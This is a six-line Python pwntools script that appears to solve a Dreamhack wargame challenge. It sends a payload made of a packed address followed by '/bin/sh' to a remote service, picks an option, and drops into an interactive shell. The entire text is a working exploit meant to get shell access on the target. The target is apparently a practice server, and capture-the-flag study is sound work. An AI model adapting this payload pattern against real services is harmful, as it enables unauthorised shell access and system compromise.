from pwn import *
payload = p32(0x804a0b0) + b'/bin/sh\x00'
p = remote('host3.dreamhack.games', 15172)
p.sendlineafter(b'name: ',payload)
p.sendline(b'19')
p.interactive()